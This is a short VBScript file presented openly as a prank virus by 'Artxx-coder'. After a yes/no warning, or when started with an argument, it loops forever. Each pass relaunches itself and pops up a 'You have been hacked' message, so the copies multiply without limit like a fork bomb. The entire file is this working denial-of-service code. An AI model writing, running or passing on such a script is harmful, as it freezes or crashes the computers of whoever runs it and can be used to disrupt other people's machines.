Dim x
If WScript.Arguments.Count > 0 Then
    
    Do
        CreateObject("WScript.Shell").Run "wscript.exe """ & WScript.ScriptFullName & """ multiplicar", 1, False
        MsgBox "You have been hacked by Artxx-coder", 0+0, "Hacked!"
    Loop
Else
    x = MsgBox("This file is a virus, do you want to proceed?", 4 + vbExclamation, "Warning!")
    
    If x = vbYes Then 
        Do
            CreateObject("WScript.Shell").Run "wscript.exe """ & WScript.ScriptFullName & """ multiplicar", 1, False
            MsgBox "You have been hacked by Artxx-coder", 0+0, "Hacked!"
        Loop
    Else
        WScript.Quit
    End If
End If
